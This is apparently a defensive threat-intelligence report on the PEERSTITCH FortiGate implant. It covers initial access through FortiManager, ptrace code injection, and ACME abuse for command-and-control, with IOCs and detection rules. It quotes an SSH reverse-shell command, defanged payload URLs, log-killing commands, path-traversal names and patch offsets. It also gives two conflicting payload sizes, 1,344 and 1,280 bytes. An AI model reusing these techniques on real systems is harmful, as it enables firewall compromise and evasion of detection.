# Technical Analysis Report: PEERSTITCH FortiGate/FortiManager Implant (2026-10-17)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-10-17
Version: 1.0-DRAFT

## Executive Summary

PEERSTITCH is a stealthy, memory-resident ARM64 implant written in C, deployed to over 500 FortiGate firewalls through exploitation of the critical FortiManager vulnerability CVE-2024-47575 ("FortiJump"). Discovered and detailed by [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/) on October 14, 2026, the implant targets two core FortiOS daemons -- `miglogd` (logging) and `iked` (IKE/IPsec VPN) -- injecting code via `ptrace` to create a covert inter-process communication bridge entirely in memory. The implant opens no listening ports, makes no outbound connections of its own, and deletes its binary from disk after execution, rendering Fortinet's disk-based Integrity Checker Tool ineffective.

The campaign, tracked as **CL-STA-0954** (overlapping with Mandiant's **UNC5820**), targeted a telecom managed service provider (MSP), compromising the central FortiManager to exfiltrate configuration archives containing serial numbers, public IPs, topology maps, VPN credentials (reversibly encrypted), and certificates with private keys for all 500+ managed FortiGate devices. The attackers then pivoted to downstream firewalls using stolen credentials, deployed PEERSTITCH via a path-traversal privilege escalation (CVE-2025-61624), and established a persistent ACME-based reverse shell C2 channel through Apache's `mod_md` module.

## Background: FortiGate / FortiManager Ecosystem

FortiGate is Fortinet's flagship network security appliance running FortiOS (Linux-based, ARM64 on most hardware models). FortiManager is the centralized management platform that provisions, monitors, and pushes configuration to fleets of FortiGate devices via the proprietary FGFM (FortiGate-to-FortiManager) protocol over TCP port 541. A compromise of FortiManager provides an attacker with a single point of control over every managed FortiGate, including access to stored credentials and the ability to push configuration changes (including CLI auto-scripts) to all devices simultaneously. This architecture makes FortiManager a high-value target for supply-chain-style attacks against organizations relying on managed security services.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| September 2024 | Initial compromise of FortiManager via CVE-2024-47575; rogue virtual FortiGate named `localhost` (serial FMG-VMTM23017412) registered from IP 45.32.41[.]202 (later 198.199.122[.]22) |
| September 2024 | Exfiltration of `.tm` configuration archive containing configs, global.db, revinfo.db, serial-to-IP mapping, and reversibly encrypted credentials for 500+ FortiGates |
| Post-exfiltration | Brute-force decryption of exfiltrated credentials; unauthorized SSL/VPN sessions to managed FortiGates from staging IPs 23.240.77[.]233 and 47.18.167[.]159 |
| Post-access | Packet capture configurations pushed to 11 service ports (TCP 3696-3706) plus TFTP (UDP 69), RADIUS (UDP 1812/1813), LDAP (TCP 389), and cleartext HTTP |
| Post-access | FortiManager impersonation via FGFM protocol to pull running configs from additional devices using the `FortiGateCloud` admin account (CVE-2024-26009 suspected) |
| Post-access | Privilege escalation via CVE-2025-61624 (auto-script path traversal); deployment of PEERSTITCH components and ACME reverse shell configuration |
| April 2026 | Fortinet patches CVE-2025-61624 |
| October 6, 2026 | Related FBI/Secret Service advisory on FortiBleed credential harvesting |
| October 14, 2026 | Unit 42 publishes PEERSTITCH analysis |
| October 16, 2026 | CISA adds CVE-2025-61624 to KEV catalog (remediation deadline: October 19, 2026) |

## Root Cause: CVE-2024-47575 (FortiJump) -- FortiManager Unauthenticated RCE

The initial access vector was CVE-2024-47575, a critical unauthenticated remote command execution vulnerability in FortiManager's FMG-Access channel (TCP 541). Attackers exploited this to register a rogue virtual FortiGate device named `localhost` with serial number FMG-VMTM23017412 to the victim's FortiManager instance. This rogue registration provided the attacker with authenticated access to the management plane, enabling exfiltration of the complete configuration archive.

The exfiltrated `.tm` archive contained:
- Configuration files for 500+ managed FortiGate firewalls
- `global.db` and `revinfo.db` SQLite databases
- Serial-to-IP inventory and network topology maps
- Reversibly encrypted VPN credentials (decryptable via brute force)
- Certificates with private keys

## Technical Analysis of the Malicious Payload

### 1. Staging and Delivery (Node.js Orchestration)

The attackers delivered PEERSTITCH through a multi-component staging chain downloaded to `/data2/template/` on compromised FortiGate devices:

| Downloaded Name | Saved As | Role | SHA-256 |
|-----------------|----------|------|---------|
| pM.js | pM.js | Environment preparation script | `9c4c4436ff5cdf0d6d68f5108031cbf3708a095cde4ef8c09316af7a7110437e` |
| a.js | index.js | Emscripten JavaScript runtime | `f84eea718526706afdf2d1a2774fab76ecb11c18fb61995a37be8249c5e379ab` |
| a.wasm | index.wasm | WebAssembly module | `b7ae166fd49a7ecfe6322a80b8aa56d6aa0825d8f5d106dab2e4fb7d14ce15a8` |
| b.js | ipssem.js | Node.js deployment orchestrator | `fc1b10c58057ef9f1f9a1e2a3d4a1c89f43b0ead451398c70ed7a6e0312b36ee` |
| dd | lldprx | ARM64 ELF ptrace injector (PEERSTITCH core) | `b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70` |

The staging payloads were hosted at:
- `hxxp[:]//23.240.77[.]233:8085/pM.js`
- `hxxp[:]//47.18.167[.]159:8085/pM.js`

The process argument string observed in execution: `lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js`

### 2. PEERSTITCH Core Implant (ARM64 ptrace Injector)

PEERSTITCH (`lldprx`) is a 64-bit Linux ARM64 ELF binary, statically linked against glibc, that performs one-shot process memory patching. Its execution flow:

1. **Target discovery:** Scans `/proc/` and parses `cmdline` to find PIDs of `/bin/miglogd` (logging daemon) and `/bin/iked` (IKE/IPsec VPN daemon).
2. **Memory layout enumeration:** Reads `/proc/<pid>/maps` to determine the target process memory layout.
3. **Process attachment:** Attaches to each target via `PTRACE_SEIZE` and halts execution with `PTRACE_INTERRUPT`.
4. **Register snapshot:** Captures registers X0-X30, SP, and PC via `PTRACE_GETREGSET`.
5. **Memory allocation:** Generates a 45-byte ARM64 bootstrap shellcode (SHA-256: `829b1cd270b30565739a478441833f49f10a49bd06f0d18cc96c8ae4a0431f11`) that calls `mmap` (syscall 0xDE) to allocate a 16,384-byte (0x4000) RWX memory region with `MAP_PRIVATE | MAP_ANONYMOUS`.
6. **Payload injection:** Writes the 1,344-byte injection payload (data block SHA-256: `bd064244dad748cf2a44074bee56f5bfab4a2b18ee944b75d1b3febd4c1fe02a`) to the new RWX buffer via `/proc/<pid>/mem`.
7. **Code patching:** Applies ARM64 NOP instructions (`0xAA0003E0` -- `MOV X0, X0`) at three offsets: `base+0x106F7B8`, `base+0x1072E20`, and `base+0x109A570`. Installs a 20-byte trampoline at `base+0x135102C` to redirect execution into the RWX buffer.
8. **Self-deletion:** Unlinks `lldprx` from disk after execution.

**Buffer layout:** The 16 KB RWX region contains a 16-slot tag ring buffer at offset `+0x0F0` and a forwarding table at offset `+0x400`.

### 3. C2 Infrastructure

**Primary C2 -- ACME-based Reverse Shell (Port 8084):**

The attackers abused Apache's built-in `mod_md` (certificate management) module to create a persistent reverse shell. By writing a malicious `md-acme.conf` configuration to `/tmp/apache2/conf/md-acme.conf` via the path-traversal vulnerability (CVE-2025-61624), they:

- Configured the ACME server to point to `23.240.77[.]233:8084`
- Embedded an SSH command in the domain name field of ACME certificate validation requests
- Set `MDRenewMode` to force repeated renewal challenges, ensuring persistence
- Mapped the DNS-01 challenge handler (`MDChallengeDns01`) to `/bin/node` for execution

The ACME C2 endpoints observed:
- `hxxp[:]//23.240.77[.]233:8084/directory`
- `hxxp[:]//23.240.77[.]233:8084/acme/new-acct`
- `hxxp[:]//23.240.77[.]233:8084/acme/order/11111`
- `hxxp[:]//23.240.77[.]233:8084/acme/authz/1`
- `hxxp[:]//23.240.77[.]233:8084/acme/finalize/61924744/774083503`

SSH reverse shell command (from ACME debug log): `kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i`

**PEERSTITCH In-Memory Signaling (No Network Footprint):**

The implant itself creates no network connections. Instead, it hooks the `miglogd` daemon to passively scan traffic flowing through the logging pipeline using `strstr()` for two markers:
- TCP port string `8550`
- Link-local IP string `169.254.0.1`

When a match is found, the hook extracts a session tag (up to 31 bytes) and writes it to the counterpart `iked` daemon's memory via `/proc/<pid>/mem` (`open`, `lseek`, `write`). When `iked` processes a VPN session and finds a matching tag, the hook takes an alternate `ADRP` return path that **skips default FortiOS security validation**, effectively creating a covert VPN bypass.

**Hard-coded runtime secret:** The string `123456` (SHA-256: `8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92`)

### 4. Platform-Specific Behavior

#### FortiOS (ARM64 Linux)

- **Delivery:** Auto-script objects via CLI path traversal (CVE-2025-61624) with names `../../../../setup` (loader) and `../../tmp/apache2/conf/md-acme.conf` (ACME config)
- **Persistence:** The PEERSTITCH implant itself has no persistence mechanism. Access is maintained through the ACME reverse shell's repeated renewal cycle and credential-based VPN access.
- **Targets:** FortiOS daemons `miglogd` and `iked` -- both are critical system processes that handle all logging and VPN operations respectively.
- **Key capability:** Covert VPN session bypass -- tagged sessions skip FortiOS security validation, allowing unauthorized network access through the firewall.

### 5. Anti-Forensics / Evasion Techniques

- **Process killing:** `killall -9 miglogd` and `killall -9 syslogd` executed before malicious operations to suppress logging
- **Log clearing:** `diagnose debug crashlog clear` to remove crash evidence
- **Configuration rollback:** Attacker-created admin accounts, VPN groups, and auto-script objects were deleted after use
- **Decoy file:** `/tmp/apache2/conf/md-acme.conf` overwritten with benign content `#0 certs managed by ACME` after payload deployment
- **Self-deletion:** `lldprx` binary removed from disk post-execution
- **Memory residence:** No persistent files; Fortinet's disk-based Integrity Checker Tool cannot detect the implant
- **Tunnel disruption:** Deliberate disruption of tunnel interfaces to mask unauthorized network activity
- **No network footprint:** PEERSTITCH creates no sockets, opens no ports, and makes no connections -- it piggybacks on existing daemon traffic flows

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| pM.js | N/A | Node.js environment preparation/staging script |
| index.js (a.js) | N/A | Emscripten JavaScript runtime for WebAssembly execution |
| index.wasm (a.wasm) | N/A | WebAssembly module -- compiled C payload |
| ipssem.js (b.js) | N/A | Node.js orchestrator that coordinates deployment |
| lldprx (dd) | N/A | ARM64 ELF ptrace injector -- the PEERSTITCH core implant |

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| FortiOS | `/data2/template/lldprx` | b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70 | PEERSTITCH core ARM64 ptrace injector |
| FortiOS | `/data2/template/pM.js` | 9c4c4436ff5cdf0d6d68f5108031cbf3708a095cde4ef8c09316af7a7110437e | Staging/preparation script |
| FortiOS | `/data2/template/ipssem.js` | fc1b10c58057ef9f1f9a1e2a3d4a1c89f43b0ead451398c70ed7a6e0312b36ee | Node.js deployment orchestrator |
| FortiOS | `/data2/template/index.js` | f84eea718526706afdf2d1a2774fab76ecb11c18fb61995a37be8249c5e379ab | Emscripten JS runtime |
| FortiOS | `/data2/template/index.wasm` | b7ae166fd49a7ecfe6322a80b8aa56d6aa0825d8f5d106dab2e4fb7d14ce15a8 | WebAssembly module |
| FortiOS | `/tmp/apache2/conf/md-acme.conf` | N/A | ACME C2 configuration (overwritten with decoy post-deploy) |
| FortiOS | `/tmp/upfile/ssh_config` | N/A | SSH configuration for reverse shell |
| FortiOS | (mmap shellcode) | 829b1cd270b30565739a478441833f49f10a49bd06f0d18cc96c8ae4a0431f11 | 45-byte ARM64 mmap bootstrap shellcode |
| FortiOS | (injection data block) | bd064244dad748cf2a44074bee56f5bfab4a2b18ee944b75d1b3febd4c1fe02a | 1,280-byte core hook injection payload |
| FortiOS | (runtime secret) | 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 | Hard-coded shared secret "123456" |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 23.240.77[.]233 | Primary staging/C2 -- payload hosting (port 8085) and ACME reverse shell (port 8084) |
| IP | 47.18.167[.]159 | Secondary staging -- payload hosting (port 8085) |
| IP | 45.32.41[.]202 | Rogue FortiGate registration IP (initial) |
| IP | 198.199.122[.]22 | Rogue FortiGate registration IP (replacement) |
| URL Pattern | `hxxp[:]//23.240.77[.]233:8085/pM.js` | Primary staging payload download |
| URL Pattern | `hxxp[:]//47.18.167[.]159:8085/pM.js` | Secondary staging payload download |
| URL Pattern | `hxxp[:]//23.240.77[.]233:8084/acme/*` | ACME C2 channel endpoints |
| URL Pattern | `hxxp[:]//23.240.77[.]233:8084/directory` | ACME directory listing (C2 initialization) |
| Protocol | FGFM / TCP 541 | FortiGate-to-FortiManager protocol (rogue device registration) |
| Rogue Device | Name: `localhost`, Serial: FMG-VMTM23017412 | Rogue virtual FortiGate registered to FortiManager |

### Behavioral

- **Cross-PID `/proc/<pid>/mem` writes:** The implant writes to `iked`'s memory from `miglogd`'s process context via `/proc/<pid>/mem` -- anomalous cross-process memory manipulation between two specific FortiOS daemons
- **Crash signals:** Signal 11 (SIGSEGV) crashes in `miglogd`, `iked`, or `syslogd` in crash logs indicate possible injection attempts
- **Process killing pattern:** Sequential `killall -9 miglogd` and `killall -9 syslogd` execution immediately before other operations
- **RWX memory regions:** Anomalous 16 KB RWX (read-write-execute) memory allocations in `miglogd` and `iked` process maps
- **NOP patches:** `0xAA0003E0` (ARM64 `MOV X0, X0` NOP) at code offsets in `iked` -- detectable by checking live process memory against known-good binary images
- **Packet capture config changes:** Unexpected sniffer configurations on ports 3696-3706, UDP 69, UDP 1812/1813, TCP 389
- **Rogue admin account activity:** Creation and rapid deletion of administrator accounts and VPN groups
- **ACME state artifacts:** Presence of `account.json`, `order.json`, `job.json` files related to ACME operations on FortiGate devices

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | CVE-2024-47575 exploitation of FortiManager FMG-Access channel (TCP 541) |
| T1078 | Valid Accounts | Recovered VPN credentials from exfiltrated configs used for SSL/VPN access; `FortiGateCloud` account abuse |
| T1068 | Exploitation for Privilege Escalation | CVE-2025-61624 auto-script path traversal for root-level file write |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Node.js execution of staging scripts (pM.js, ipssem.js, index.js) via MDChallengeDns01 handler |
| T1055.008 | Process Injection: Ptrace System Calls | PTRACE_SEIZE/PTRACE_INTERRUPT to inject code into miglogd and iked |
| T1055 | Process Injection | Cross-process memory writing via /proc/\<pid\>/mem between daemons |
| T1071.001 | Application Layer Protocol: Web Protocols | ACME protocol abuse over HTTP (port 8084) for C2 communication |
| T1105 | Ingress Tool Transfer | HTTP download of staging payloads from C2 on port 8085 |
| T1070.004 | Indicator Removal: File Deletion | Self-deletion of lldprx binary after execution; removal of rogue admin accounts and scripts |
| T1070.001 | Indicator Removal: Clear Linux or Mac System Logs | `killall -9 syslogd`; `diagnose debug crashlog clear` |
| T1557 | Adversary-in-the-Middle | Packet capture configurations on managed firewalls sniffing RADIUS, LDAP, TFTP, and cleartext HTTP |
| T1040 | Network Sniffing | Cleartext traffic capture across 11 service ports on compromised firewalls |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Killing miglogd and syslogd to suppress logging during operations |
| T1021.004 | Remote Services: SSH | SSH reverse shell through ACME C2 channel |

## Impact Assessment

- **Breadth:** 500+ FortiGate firewalls under a single MSP compromised via one FortiManager instance; downstream client networks potentially exposed
- **Depth:** Full root-level compromise of FortiGate devices; VPN security validation bypass; credential and certificate theft for all managed devices
- **Stealth:** Memory-resident implant with no disk footprint, no network connections, no listening ports; evades Fortinet's Integrity Checker Tool; anti-forensics include log suppression, crash log clearing, and evidence cleanup
- **Supply chain risk:** Single management platform compromise cascaded to hundreds of downstream firewalls, illustrating the force-multiplier effect of centralized management compromise
- **Credential exposure:** All VPN credentials, certificates, and private keys from the exfiltrated archive remain valid until individually rotated on every device

## Detection & Remediation

### Immediate Detection

1. **Check live process memory** of `miglogd` and `iked` for anomalous RWX regions:
   ```
   cat /proc/<miglogd_pid>/maps | grep rwx
   cat /proc/<iked_pid>/maps | grep rwx
   ```

2. **Compare code sections** of running daemons against known-good binary images for NOP patches (`0xAA0003E0`) at offsets `0x106F7B8`, `0x1072E20`, `0x109A570`, and trampoline at `0x135102C`.

3. **Search for staging artifacts:**
   ```
   find / -name "lldprx" -o -name "pM.js" -o -name "ipssem.js" -o -name "index.wasm" 2>/dev/null
   ls -la /data2/template/
   cat /tmp/apache2/conf/md-acme.conf
   ```

4. **Check for ACME state files:** Look for `account.json`, `order.json`, `job.json` in Apache's ACME state directories.

5. **Review crash logs** for Signal 11 crashes in `miglogd`, `iked`, or `syslogd`.

6. **Inspect firewall logs** for connections to IOC IP addresses on ports 8084 and 8085.

7. **Check for rogue FGFM registrations:** Look for device named `localhost` with serial `FMG-VMTM23017412` in FortiManager device inventory.

8. **Deploy Fortinet Threat Prevention signatures** 95788 and 96788 for CVE-2024-47575 traffic detection.

### Remediation

1. **Immediate:** Isolate compromised FortiManager from the management network.
2. **Credential rotation:** Rotate ALL VPN credentials, certificates, and private keys on every managed FortiGate device -- the exfiltrated archive contains valid credentials until rotated.
3. **Patch:** Apply Fortinet patches for CVE-2024-47575 (FortiManager) and CVE-2025-61624 (FortiOS).
4. **Memory inspection:** Reboot all managed FortiGate devices to clear memory-resident implants (disk reimaging alone is insufficient for detection but reboot clears RWX injections).
5. **Review auto-scripts:** Audit all `system.auto-script` objects for path-traversal sequences (`../`).
6. **Admin account audit:** Review all administrator accounts and VPN groups; remove any unauthorized entries.
7. **Network segmentation:** Restrict FortiManager management interfaces to dedicated management VLANs with strict access controls.

### Long-Term Hardening

- Enforce zero-trust network segmentation for management plane access to FortiManager
- Implement integrity monitoring for FortiOS daemon process memory (not just disk-based file integrity)
- Monitor FGFM protocol (TCP 541) traffic for unauthorized device registrations
- Deploy network detection rules for known C2 infrastructure and ACME protocol abuse patterns
- Rotate credentials on a regular schedule; do not rely on reversible encryption for stored passwords
- Monitor for cross-PID `/proc/<pid>/mem` access patterns between FortiOS daemons

## Detection Rules

These detections target the CL-STA-0954 campaign's specific C2 infrastructure, staging patterns, and PEERSTITCH implant artifacts at PoC/advisory-specific altitude. Compiles does not equal fires -- verify in your environment's log pipeline before production deployment.

### Sigma: PEERSTITCH C2 Infrastructure Connection via Firewall

Detects outbound connections to known PEERSTITCH C2 staging IP addresses (23.240.77[.]233, 47.18.167[.]159, 45.32.41[.]202, 198.199.122[.]22) in firewall logs.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check blocked by proxy (MITRE ATT&CK data fetch 403); sigma convert splunk exit 0; sigma convert log_scale exit 0. Portability proven. IP IOCs are campaign-specific infrastructure with negligible benign overlap. FP risk: only if legitimate traffic to these IPs exists (unlikely for non-Fortinet orgs). Evasion: actor rotates infrastructure. -->
```yaml
title: PEERSTITCH C2 Infrastructure Connection via Firewall
id: f8a3b1c2-4d5e-4f70-8192-a3b4c5d6e7f8
status: experimental
description: >
    Detects outbound connections to known PEERSTITCH C2 staging IP addresses
    used for payload delivery (port 8085) and ACME-based reverse shell (port 8084)
    in the CL-STA-0954 campaign targeting FortiGate firewalls.
references:
    - https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/
author: Actioner
date: 2026-10-17
tags:
    - attack.t1071.001
    - attack.t1105
logsource:
    category: firewall
detection:
    selection:
        dst_ip:
            - '23.240.77.233'
            - '47.18.167.159'
            - '45.32.41.202'
            - '198.199.122.22'
    condition: selection
falsepositives:
    - Legitimate traffic to these IPs from non-Fortinet infrastructure (unlikely)
level: high
```

### Sigma: PEERSTITCH Staging Payload Download via Proxy

Detects HTTP requests to known PEERSTITCH staging infrastructure downloading the pM.js preparation script on port 8085.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check blocked by proxy (MITRE ATT&CK data fetch 403); sigma convert splunk exit 0; sigma convert log_scale exit 0. Portability proven. URI pattern + destination IP combination is highly specific. FP risk: minimal; legitimate pM.js downloads from these exact IPs is near-zero probability. -->
```yaml
title: PEERSTITCH Staging Payload Download via Proxy
id: a1b2c3d4-e5f6-4890-abcd-1234567890ab
status: experimental
description: >
    Detects HTTP requests to known PEERSTITCH staging infrastructure downloading
    the pM.js preparation script on port 8085, as observed in CL-STA-0954.
references:
    - https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/
author: Actioner
date: 2026-10-17
tags:
    - attack.t1105
logsource:
    category: proxy
detection:
    selection_uri:
        c-uri|contains: '/pM.js'
    selection_ip:
        dst_ip:
            - '23.240.77.233'
            - '47.18.167.159'
    condition: selection_uri and selection_ip
falsepositives:
    - Legitimate JavaScript file named pM.js from unrelated infrastructure
level: critical
```

### Snort: PEERSTITCH C2 Payload Download and ACME Channel

Detects HTTP traffic to known PEERSTITCH staging (port 8085) and ACME C2 (port 8084) infrastructure.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -T with rules in local.rules, exit 0, "Snort successfully validated the configuration!". Three rules: SID 2100001 (primary C2 pM.js download), SID 2100002 (secondary C2 pM.js download), SID 2100003 (ACME C2 channel). IP+port+URI combination is highly campaign-specific. Snort 2.9.20 syntax. -->
```snort
alert tcp $HOME_NET any -> 23.240.77.233 8085 (msg:"Actioner - PEERSTITCH Staging Payload Download from Primary C2"; flow:established,to_server; content:"/pM.js"; http_uri; fast_pattern; classtype:trojan-activity; reference:url,unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/; sid:2100001; rev:1;)
alert tcp $HOME_NET any -> 47.18.167.159 8085 (msg:"Actioner - PEERSTITCH Staging Payload Download from Secondary C2"; flow:established,to_server; content:"/pM.js"; http_uri; fast_pattern; classtype:trojan-activity; reference:url,unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/; sid:2100002; rev:1;)
alert tcp $HOME_NET any -> 23.240.77.233 8084 (msg:"Actioner - PEERSTITCH ACME C2 Channel to Known Infrastructure"; flow:established,to_server; content:"/acme/"; http_uri; fast_pattern; classtype:trojan-activity; reference:url,unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/; sid:2100003; rev:1;)
```

### Suricata: PEERSTITCH C2 Payload Download and ACME Channel

Detects HTTP traffic to known PEERSTITCH staging and ACME C2 infrastructure using Suricata dot-notation sticky buffers.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0, "Configuration provided was successfully loaded. Exiting." Two rules: SID 2200001 (staging download from both C2 IPs), SID 2200002 (ACME C2 channel). IP+port+URI combination highly campaign-specific. -->
```suricata
alert http $HOME_NET any -> [23.240.77.233,47.18.167.159] 8085 (msg:"Actioner - PEERSTITCH Staging Payload Download from C2"; flow:established,to_server; http.uri; content:"/pM.js"; fast_pattern; classtype:trojan-activity; reference:url,unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/; metadata:author Actioner, created_at 2026-10-17; sid:2200001; rev:1;)
alert http $HOME_NET any -> 23.240.77.233 8084 (msg:"Actioner - PEERSTITCH ACME C2 Reverse Shell Channel"; flow:established,to_server; http.uri; content:"/acme/"; fast_pattern; classtype:trojan-activity; reference:url,unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/; metadata:author Actioner, created_at 2026-10-17; sid:2200002; rev:1;)
```

### YARA: PEERSTITCH FortiGate ARM64 Implant

Detects the PEERSTITCH ARM64 ELF injector binary by matching characteristic strings targeting FortiOS daemons, marker values, and ACME C2 artifacts.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. ELF magic + 4-of-7 string threshold. Strings sourced from Unit42 analysis: daemon paths, marker IP/port, proc/mem format, ACME path, decoy string, binary name. Sample test: not fired (pos.txt lacks ELF header; byte-level test requires ELF construction not available here). Rule covers the known sample hash and variants sharing >=4 of these distinctive strings. FP risk: near-zero; combination of ELF + FortiOS-specific daemon paths + ACME artifacts is unique to this implant family. -->
```yara
rule Malware_PEERSTITCH_FortiGate_Implant
{
    meta:
        description = "Detects PEERSTITCH ARM64 memory-resident implant targeting FortiGate miglogd and iked daemons via characteristic strings"
        author = "Actioner"
        date = "2026-10-17"
        reference = "https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/"
        hash = "b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $target1 = "/bin/miglogd" ascii
        $target2 = "/bin/iked" ascii
        $marker1 = "169.254.0.1" ascii
        $proc_mem = "/proc/%d/mem" ascii
        $acme_path = "/tmp/apache2/conf/md-acme.conf" ascii
        $acme_decoy = "#0 certs managed by ACME" ascii
        $binary_name = "lldprx" ascii

    condition:
        uint32(0) == 0x464C457F and
        filesize < 5MB and
        4 of them
}
```

## Lessons Learned

1. **Centralized management is a single point of failure.** The compromise of one FortiManager instance yielded credentials, certificates, and configuration access to 500+ downstream firewalls. Organizations must treat management platforms with the same rigor as domain controllers -- isolated networks, multi-factor authentication, and continuous integrity monitoring.

2. **Disk-based integrity checking is insufficient for memory-resident threats.** PEERSTITCH leaves no files on disk after execution. Fortinet's Integrity Checker Tool, which only scans the filesystem, cannot detect this implant. Defenders need runtime memory inspection capabilities for critical infrastructure daemons.

3. **Legitimate protocol abuse creates blind spots.** The use of ACME certificate management protocol for C2 and the piggyback on existing FortiOS daemon traffic flows makes detection at the network layer extremely difficult. Protocol-aware inspection and behavioral baselines for management traffic are essential.

4. **Credential exfiltration outlasts patching.** Patching CVE-2024-47575 stops new exploitation but does not invalidate the stolen credentials and certificates. Every credential and key material from the exfiltrated archive must be individually rotated across all 500+ devices -- a massive operational undertaking that many organizations may defer, leaving a persistent access window.

5. **Supply chain risk amplification through MSPs.** A single MSP compromise exposes not just the MSP but all its downstream clients. This campaign demonstrates the force-multiplier effect that threat actors achieve by targeting managed service providers.

## Sources

<!-- Every source MUST be a markdown link [Name](URL). A source without a URL is a bug. -->

- [Palo Alto Unit 42 - PEERSTITCH Technical Analysis](https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/) -- Primary source: deep technical analysis of the PEERSTITCH implant, full IOC list, YARA rule, and CL-STA-0954 campaign details
- [The Hacker News - Attackers Exploit FortiOS Flaw](https://thehackernews.com/2026/10/attackers-exploit-fortios-flaw-to.html) -- Secondary reporting with CVE-2025-61624 CVSS details and CISA KEV catalog addition
- [Security Affairs - PEERSTITCH Malware Analysis](https://securityaffairs.com/201077/malware/peerstitch-malware-how-attackers-compromised-500-firewalls-through-fortimanager.html) -- Secondary reporting with additional campaign context and remediation guidance

---
*Report generated by Actioner*
